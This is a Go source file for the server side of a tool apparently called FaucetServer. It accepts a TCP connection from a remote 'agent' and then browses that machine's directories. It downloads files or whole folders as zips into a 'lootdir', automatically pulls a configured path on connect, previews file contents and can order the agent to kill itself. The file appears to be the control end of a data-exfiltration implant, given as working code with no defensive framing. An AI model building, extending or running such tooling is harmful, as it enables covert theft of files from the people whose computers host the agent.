package server

import (
	"FaucetServer/internal/coms"
	"FaucetServer/internal/config"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/tawesoft/golib/v2/dialog"
)

func Listen() error {
	listenerAdr, found := config.Config["listen"]
	if !found || len(listenerAdr) < 3 || !strings.Contains(listenerAdr, ":") {
		return errors.New("listener not specified or invalid value")
	}

	listener, err := net.Listen("tcp", listenerAdr)
	if err != nil {
		return err
	}

	go server(listener)

	return nil
}

func server(listener net.Listener) {
	var err error
	for {
		conn, err = listener.Accept()
		if err != nil {
			dialog.Error(fmt.Sprintf("Error from server: %s", err.Error()))
			time.Sleep(5 * time.Second)
			continue
		}

		Connected = true

		if _, exists := config.Config["autodownload"]; exists {
			Download(config.Config["autodownload"], "d", config.Config["lootdir"])
		}

		for Connected {
			time.Sleep(500 * time.Millisecond)
		}
	}
}

var conn net.Conn
var Connected bool
var ConLock sync.Mutex

func GracefulClose() {
	Connected = false
	conn.Close()
}

func ListFiles() map[string]any {
	ConLock.Lock()
	defer ConLock.Unlock()
	err := coms.Send(map[string]any{
		"ls": "",
	}, conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return nil
	}
	response, err := coms.Read(conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return nil
	}
	return response
}

func ChDir(name string) {
	ConLock.Lock()
	defer ConLock.Unlock()
	err := coms.Send(map[string]any{
		"cd": name,
	}, conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
	}
	_, err = coms.Read(conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
	}
}

var Downloading int = -1

func Download(name, fileType, path string) string {
	ConLock.Lock()
	defer ConLock.Unlock()
	defer func() { Downloading = -1 }()

	err := coms.Send(map[string]any{
		"download": name,
	}, conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return ""
	}

	name = filepath.Base(name)

	if fileType == "d" {
		name += ".zip"
	}

	var suffix int
	newName := name
	for {
		if suffix > 0 {
			newName = name + strconv.Itoa(suffix)
		}
		_, err := os.Stat(filepath.Join(path, newName))
		if err == nil {
			suffix++
		} else {
			break
		}
	}
	newName = filepath.Join(path, newName)

	outHandle, err := os.Create(newName)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return ""
	}
	defer outHandle.Close()

	for {
		chunk, err := coms.Read(conn)
		if err != nil {
			log.Println(err)
			GracefulClose()
			return ""
		}
		if chunk["result"] == "success" {
			break
		}
		if _, exists := chunk["chunk"]; !exists {
			continue
		}
		out, err := hex.DecodeString(chunk["chunk"].(string))
		if err != nil {
			log.Println(err)
			GracefulClose()
			return ""
		}
		Downloading += len(out)
		outHandle.Write(out)
		coms.Send(map[string]any{
			"result": "success",
		}, conn)
	}
	return newName
}

func Preview(name string) string {
	ConLock.Lock()
	defer ConLock.Unlock()
	defer func() { Downloading = -1 }()

	err := coms.Send(map[string]any{
		"download": name,
	}, conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return ""
	}

	chunk, err := coms.Read(conn)
	if err != nil {
		log.Println(err)
		GracefulClose()
		return ""
	}

	if chunk["chunk"] == nil {
		return ""
	}

	out, err := hex.DecodeString(chunk["chunk"].(string))
	if err != nil {
		log.Println(err)
		GracefulClose()
		return ""
	}
	Downloading += len(out)
	coms.Send(map[string]any{
		"result": "success",
	}, conn)

	for {
		chunk, err := coms.Read(conn)
		if err != nil {
			log.Println(err)
			break
		}
		if chunk["result"] == "success" {
			break
		}
		coms.Send(map[string]any{
			"result": "success",
		}, conn)
	}
	if len(out) > 2000 {
		out = append(out[0:2000], []byte("...")...)
	}
	return strings.ToValidUTF8(string(out), "?")
}

func KillAgent() {
	coms.Send(map[string]any{
		"kill": "yourself",
	}, conn)
	GracefulClose()
}
